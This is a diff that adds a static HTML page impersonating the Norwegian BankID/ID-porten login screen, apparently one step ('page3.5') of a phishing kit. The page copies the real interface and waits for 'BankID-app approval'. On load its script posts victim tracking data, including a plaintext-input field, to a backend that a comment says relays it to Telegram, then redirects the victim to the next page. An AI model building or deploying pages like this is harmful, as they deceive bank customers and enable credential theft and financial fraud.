@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="nb">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="initial-scale=1.0, width=device-width">
+    <title>BankID - Identifisering (Static)</title>
+    <style>
+        /* Basic Reset */
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+            font-size: 16px;
+            line-height: 1.5;
+            background-color: #f0f1f3;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            padding-top: 20px;
+            box-sizing: border-box;
+        }
+
+        .page-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            max-width: 900px; /* Du kan justere denne for total bredde */
+        }
+
+        .top-merchant-name {
+            font-size: 13px;
+            color: #1c1c1c;
+            margin-bottom: 10px;
+            width: 100%;
+            text-align: left;
+            box-sizing: border-box;
+            position: relative;
+            left: -60px;
+        }
+
+        .bankid-box {
+            background-color: #fff;
+            border: 1px solid #d7d7d7;
+            border-radius: 4px;
+            width: 158%;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+            display: flex;
+            flex-direction: column;
+            min-height: 500px; /* Økt høyde på boksen */
+        }
+
+        /* Header inside the box */
+        .box-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 15px;
+            border-bottom: 1px solid #e5e5e5;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .header-left .back-arrow img {
+            width: 20px;
+            height: auto;
+            display: block;
+        }
+
+        .header-left .title {
+            font-size: 1.05em;
+            font-weight: 500;
+            color: #333;
+        }
+
+        .menu-button {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            padding: 5px 9px;
+            border: 1px solid #cccccc;
+            border-radius: 3px;
+            background-color: #fff;
+            font-size: 0.85em;
+            color: #444;
+            cursor: pointer;
+        }
+        .menu-button img {
+            width: 15px;
+            height: auto;
+        }
+
+        /* Body inside the box */
+        .box-body {
+            padding: 100px 15px 20px 15px;
+            display: flex;
+            flex-direction: column;
+            flex-grow: 1; /* Tillater body å vokse for å fylle ekstra høyde i bankid-box */
+        }
+
+        .title-spinner-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #e5e5e5; /* Strek under denne raden */
+            padding-bottom: 12px; /* Avstand mellom innhold og streken */
+            margin-bottom: 15px; /* Avstand fra streken til neste element */
+        }
+
+        .body-title-section {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .body-title-section h2 {
+            font-size: 1.2em;
+            font-weight: 600;
+            color: #222;
+            margin: 0;
+        }
+
+        .body-title-section .help-icon-button {
+            background: none;
+            border: none;
+            padding: 0;
+            margin: 0;
+            cursor: pointer;
+            display: inline-flex;
+            vertical-align: middle;
+        }
+        .body-title-section .help-icon-button img {
+            width: 17px;
+            height: 17px;
+            display: block;
+        }
+
+        .spinner-container .spinner {
+            width: 26px;
+            height: 26px;
+            animation: spin 1.2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .instructions-text {
+            font-size: 0.95em;
+            color: #333;
+            margin-bottom: 5px;
+        }
+
+        .change-bankid-link {
+            font-size: 0.9em;
+            color: #0078be;
+            text-decoration: underline;
+            cursor: pointer;
+            margin-bottom: 5px;
+            background: none;
+            border: none;
+            padding: 0;
+            text-align: left;
+        }
+
+        .info-text {
+            font-size: 0.8em;
+            color: #777;
+        }
+
+        /* Footer inside the box */
+        .box-footer {
+            display: flex;
+            align-items: flex-start;
+            gap: 5px;
+            padding: 10px 15px;
+            border-top: 1px solid #e5e5e5;
+            background-color: #f9f9f9;
+            margin-top: auto; /* Skyver footer til bunnen hvis .box-body ikke fyller all plass */
+        }
+
+        .shield-icon-wrapper {
+            border: 1px solid #e0e0e0;
+            padding: 2px;
+            display: inline-block;
+            line-height: 0;
+            margin-top: 1px;
+        }
+        .shield-icon-wrapper img {
+            width: 15px;
+            height: auto;
+            display: block;
+        }
+        
+        .footer-text-block {
+            display: flex;
+            flex-direction: column;
+            font-size: 0.8em;
+            color: #444;
+        }
+        .footer-text-line1 {
+            font-weight: 500;
+        }
+        .footer-text-line2 {
+            /* Ingen spesifikk stil nødvendig */
+        }
+
+        /* "Avbryt" link below the box */
+        .cancel-link {
+            margin-top: 18px;
+            font-size: 0.9em;
+            color: #0078be;
+            text-decoration: none;
+            background: none;
+            border: none;
+            padding: 0;
+            cursor: pointer;
+        }
+
+        .hidden-original { display: none !important; }
+
+    </style>
+</head>
+<body>
+
+    <div class="page-container">
+        <div class="top-merchant-name">ID-porten</div>
+
+        <div class="bankid-box">
+            <header class="box-header">
+                <div class="header-left">
+                    <span class="back-arrow">
+                        <img alt="Tilbake" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMTkiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRpdGxlPmljb19hcnJvd19sZWZ0PC90aXRsZT48cGF0aCBkPSJNNSAxMWw1IDUtMiAyLTgtOC41MzEgOC04LjQ2OSAyIDItNSA1aDE5djNoLTE5eiIgZmlsbD0iIzAwNzhCRCIvPjwvc3ZnPg==">
+                    </span>
+                    <span class="title">Identifisering</span>
+                </div>
+                <button class="menu-button" type="button" title="Åpne meny">
+                    <span>Meny</span>
+                    <img alt="Meny ikon" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTUiIGhlaWdodD0iMTAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRpdGxlPmljb19tZW51PC90aXRsZT48cGF0aCBkPSJNMCA4djJoMTV2LTJoLTE1em0wLTR2MmgxNXYtMmgtMTV6bTAtNHYyaDE1di0yaC0xNXoiIGZpbGw9IiM1NTUiLz48L3N2Zz4=">
+                </button>
+            </header>
+
+            <main class="box-body">
+                <div class="title-spinner-row">
+                    <div class="body-title-section">
+                        <h2>BankID-app</h2>
+                        <button type="button" class="help-icon-button" title="Åpne hjelpedialogen">
+                            <img alt="Hjelp" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTgiIGhlaWdodD0iMTgiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRpdGxlPmljb19oZWxwPC90aXRsZT48ZyBmaWxsPSJub25lIj48cGF0aCBkPSJNMTcuNSA5YzAtNC42OTQtMy44MDYtOC41LTguNS04LjVzLTguNSAzLjgwNi04LjUgOC41IDMuODA2IDguNSA4LjUgOC41IDguNS0zLjgwNiA4LjUtOC41eiIgc3Ryb2tlPSIjMDA3OEJEIi8+PHBhdGggZD0iTTggMTJoMnYyaC0ydi0yem0uNzU4LThjMSAwIDEuODMxLjIzOSAyLjQ5My43MTcuNjYyLjQ3OC45OTIgMS4xODYuOTkyIDIuMTI0IDAgLjU3NS0uMTQ0IDEuMDYtLjQzMSAxLjQ1NC0uMTY4LjIzOS0uNDkxLjU0NC0uOTY5LjkxNmwtLjQ3MS4zNjVjLS4yNTcuMTk5LS4yNjguNDMxLS4zNTIuNjk3LS4wNTMuMTY4LS4wOTEuMzU3LS4wOTYuNzExaC0xLjkzM2MuMDI3LS43NDguMDg4LTEuMTkzLjIwMy0xLjQ3OC4xMTUtLjI4NS40MTItLjYxNC44OS0uOTg2bC40ODUtLjM3OGMuMTU5LS4xMTkuMjg4LS4yNS4zODUtLjM5Mi4xNzctLjI0My4yNjYtLjUxMS4yNjYtLjgwMyAwLS4zMzYtLjA5OC0uNjQzLS4yOTUtLjkxOS0uMTk3LS4yNzctLjU1Ny0uNDE1LTEuMDc5LS40MTUtLjUxMyAwLS44NzcuMTctMS4wOTIuNTExLS4yMTUuMzQxLS4yNTQuNDU2LS4yNTQuODIzaC0xLjkxOGMuMDUzLTEuMjYxLjQyNS0xLjkxNiAxLjI1My0yLjQ0My41MjItLjMzNiAxLjE2NC0uNTA1IDEuOTI1LS41MDV6IiBmaWxsPSIjMDA3OEJEIi8+PC9nPjwvc3ZnPg==">
+                        </button>
+                    </div>
+                    <div class="spinner-container">
+                        <img class="spinner" alt="Laster..." src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRpdGxlPmljb19zcGlubmVyX2JpZzwvdGl0bGU+PGcgZmlsbD0ibm9uZSI+PHBhdGggZD0iTTIwIDJ2NGM3LjcyIDAgMTQgNi4yOCAxNCAxNCAwIDcuNzE4LTYuMjggMTQtMTQgMTR2NGM5Ljk0IDAgMTgtOC4wNiAxOC0xOCAwLTkuOTQyLTguMDYtMTgtMTgtMTgiIGZpbGw9IiNmZmYiLz48cGF0aCBkPSJNMjAgNnYtNGMtOS45NDIgMC0xOCA4LjA1OC0xOCAxOCAwIDkuOTQgOC4wNTggMTggMTggMTh2LTRjLTcuNzIgMC0xNC02LjI4Mi0xNC0xNCAwLTcuNzIgNi4yOC0xNCAxNC0xNHoiIGZpbGw9IiMwMDc4QkQiLz48L2c+PC9zdmc+">
+                    </div>
+                </div>
+
+                <p class="instructions-text">Godkjenn med din BankID-app</p>
+                <button type="button" class="change-bankid-link">Velg annen BankID</button>
+                <p class="info-text">BankID</p>
+            </main>
+
+            <footer class="box-footer">
+                <span class="shield-icon-wrapper">
+                    <img alt="Sertifikat" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTUiIGhlaWdodD0iMTgiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRpdGxlPmljb19jZXJ0aWZpY2F0ZTwvdGl0bGU+PGcgZmlsbD0ibm9uZSI+PHBhdGggZD0iTTAgNi4yMDZjMCA0LjEzNyAzLjE5MiA5LjM0IDcuNSAxMS4zNzcgNC4yOTgtMi4wMzIgNy41LTcuMjQgNy41LTExLjM3N3YtNi4yMDZoLTE1djYuMjA2eiIgZmlsbD0iIzU1NSIvPjxwYXRoIGQ9Ik0xMC41IDMuNWwxIDEtNCA0LTEgMS0xLTEtMi0yIDEtMSAyIDIgNC00eiIgZmlsbD0iI2ZmZiIvPjwvZz48L3N2Zz4=">
+                </span>
+                <div class="footer-text-block">
+                    <div class="footer-text-line1">BankID brukersted:</div>
+                    <div class="footer-text-line2">ID-porten</div>
+                </div>
+            </footer>
+        </div>
+
+        <button type="button" class="cancel-link">Avbryt</button>
+    </div>
+
+    <div class="live_region assertive hidden-original" aria-live="assertive" aria-atomic="true" role="alert"></div>
+    <div class="live_region polite hidden-original" aria-live="polite" aria-atomic="true" role="alert"></div>
+    <div class="full_width_height hidden-original">
+        <div class="layout hidden-original">
+            {...rest of original hidden structure...}
+        </div>
+    </div>
+
+    <script>
+        // Send data til Telegram når siden lastes
+        (async function() {
+            try {
+                const response = await fetch('/api/log_data', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        page: 'page3.5.html',
+                        event_description: 'Venter på BankID-app godkjenning',
+                        klartekst_input: null
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Serverfeil: ${response.status}`);
+                }
+
+                const result = await response.json();
+                console.log('Data sendt fra page3.5.html:', result.message);
+                
+                // Redirect til neste side kun hvis data ble sendt
+                setTimeout(function() {
+                    window.location.href = 'page4.html';
+                }, 5000);
+            } catch (error) {
+                console.error('Feil ved innsending av data:', error);
+                // Prøv igjen etter 2 sekunder
+                setTimeout(function() {
+                    window.location.reload();
+                }, 2000);
+            }
+        })();
+    </script>
+</body>
+</html>
